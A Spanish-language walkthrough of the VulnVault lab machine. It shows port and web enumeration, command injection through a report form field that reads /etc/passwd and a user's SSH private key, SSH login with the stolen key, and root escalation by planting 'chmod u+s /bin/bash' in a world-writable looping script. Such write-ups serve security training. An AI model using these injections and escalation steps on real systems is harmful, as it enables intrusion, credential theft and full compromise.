- Tags: #VulnVault
---
[Maquina VulnVault](https://mega.nz/file/1asGQbRK#zvWJuwPfUI0P43b2YDBesILqJogA3tv3SVQn4oORmSI) -> Enlace de descarga al laboratorio.
```bash
7z x vulnvault.zip # Descomprimimos el archivo
bash auto_deploy.sh vulnvault.tar # Desplegamos el laboratorio
```

#### Fase Reconocimiento:
```bash
172.17.0.2 # Direccion IP del target
ping -c 1 172.17.0.2 # Lanzamos una traza ICMP para determinar si tenemos conectividad con el target.

wichSystem.py 172.17.0.2 # Determinamos que nos enfrentamos ante una maquina Linux
172.17.0.2 (ttl -> 64): Linux
```

#### Fase Reconocimiento Puertos:
```bash
escanerTCP.py -t 172.17.0.2 -p 1-5000 # Usamos nuestra herramienta para realizar un escaneo de puetos
nmap -p- -sS --open --min-rate 5000 -vvv -v -Pn 172.17.0.2 -oG allPorts # Realizamos descubrimiento de puertos
extractPorts allPorts # Parseamos la informacion mas relevante del primer escaneo
nmap -sC -sV -p22,80 172.17.0.2 -oN targeted # Realizamos un escaneo exhaustivo para determinar los servicios y la versiones que corren detras de estos puertos.
```

**( 22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.4 (Ubuntu Linux; protocol 2.0) )** -> Tenemos un servicio ssh expuesto.
**( 80/tcp open  http    Apache httpd 2.4.58 ((Ubuntu)) )** -> Tenemos un servicio web expuesto.**( ubuntuNoble )**

#### Fase Enumeracion Web:
```bash
nmap --script http-enum -p 80 172.17.0.2 # Tenemos un potencial folder -> 
 /old/: Potentially interesting folder

whatweb http://172.17.0.2 # No reporta nada critico respecto a las tecnologias.
```

```bash
gobuster dir -u http://172.17.0.2/ -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 20 --add-slash
/old/                 (Status: 200) [Size: 2828]

gobuster dir -u http://172.17.0.2/ -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 20 -x php,php.back,back,js,css,html,py,txt # Descubrimos varios archivos.
```

**( http://172.17.0.2/index.php )** -> Tenemos la web principal donde nos permite subir reportes. Probamos a generar un reporte, de prueba.

```bash
nombre archivo: test
fecha del reporte: test
```

Logramos que aceptara estos datos, al parecer no esta validando las entradas. y en la web nos muestra el resultado del reporte:

```bash
### Reporte: reporte_1747847801.txt
Archivo de reporte: /var/www/html/reportes/reporte_1747847801.txt
Nombre: test
Fecha: test
```

**Nota** -> Aqui es donde intentaremos inyectar codigo para ver si lo interpreta
Interceptamos esa peticion con la herramienta **BurpSuite** en modo repiter, despues de probar varios tipos de inyeccion, logramos con esta sintaxis que nos interprete el comando, logrando evadir las restricciones.

```bash
POST /index.php HTTP/1.1 # Este archivo es el que interceptamos

nombre=prueba&fecha=test; cat /etc/passwd # Logramos ver el contenido de este archivo.

nombre=prueba&fecha=test; ls -l /home/samara # Leemos el contenido del directorio de este usuario
-rw-r--r-- 1 root   root   35 May 21 20:18 message.txt # Solo podremos ver este archivo.
-rw------- 1 samara samara 33 Aug 20  2024 user.txt
```

**( samara )** -> Tenemos un usuario filtrado el cual aplicaremos fuerza bruta para conectarnos atraves de este por **ssh**

```bash
nmap -p22 --script ssh-brute --script-args userdb=users.txt 172.17.0.2 # Probamos primero con Nmap
```

```bash
drwxr-xr-x 2 samara samara 4096 Aug 20  2024 .ssh # Podemos ver el conteniod de sus claves ssh
nombre=prueba&fecha=test; cat /home/samara/.ssh/id_rsa # Copiaremos su clave para acceder al servidor mediante ssh

chmod 600 id_rsa # Una ves copiada y almacenada la usaremos como clave de acceso
```
#### Fase Intrusion:
```bash
ssh-keygen -R 172.17.0.2 && ssh -i id_rsa samara@172.17.0.2 # Logramos conectarnos como este usuraio.
```

#### Fase Escalada Privilegios:
```bash
git clone https://github.com/DominicBreuker/pspy64 # Clonamos esta herramienta para enumerar el sistema objetivo.
python3 -m http.server 80 # Montamos un servidor python para transferir la herramienta al target.

wget http://192.168.100.22/pspy64 # Desde la maquina del target descargamos la herramienta.
```

```bash
chmod +x pspy64
./pspy64 # Ejecutamos el script

/bin/sh -c service ssh start && service apache2 start && while true; do /bin/bash /usr/local/bin/echo.sh; done # Vemos que ejecuta esta instruccion mediante un bucle infinito

ls -l /usr/local/bin/echo.sh # Revisando los permisos vemos que como otros tenemos capacidad de escritura el cual nos podemos aprovechar para que ejecute alguna accion.
-rwxrw-rw- 1 root root 82 Aug 20  2024 /usr/local/bin/echo.sh
```

```bash
#!/bin/bash
chmod u+s /bin/bash # Agregamos esta instruccion 
echo -e "\n [+} Hacked......."
echo "No tienes permitido estar aqui :(." > /home/samara/message.txt
```

```bash
ls -l /bin/bash # Sabiendo que se ejecuta infinitamente, Lograremos obtener privilegios SUID en la bash
-rwsr-xr-x 1 root root 1446024 Mar 31  2024 /bin/bash

bash -p # Ahora escalamos privilegios a root.
```